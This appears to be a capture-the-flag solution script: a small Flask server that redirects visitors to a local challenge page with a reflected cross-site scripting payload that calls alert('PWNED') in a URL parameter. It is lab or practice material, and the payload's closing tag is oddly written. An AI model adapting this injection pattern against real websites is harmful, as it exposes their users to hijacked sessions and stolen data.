import flask

HOST = 'hacker.localhost'
PORT = 1337
TARGET = 'http://challenge.localhost/ephemeral'

app = flask.Flask(__name__)

@app.route('/')
def spawn():
  return flask.redirect(f'{TARGET}?msg=<script>alert(%27PWNED%27)<%27script>')

app.config['SERVER_NAME'] = 'hacker.localhost:1337'
app.run(HOST, PORT)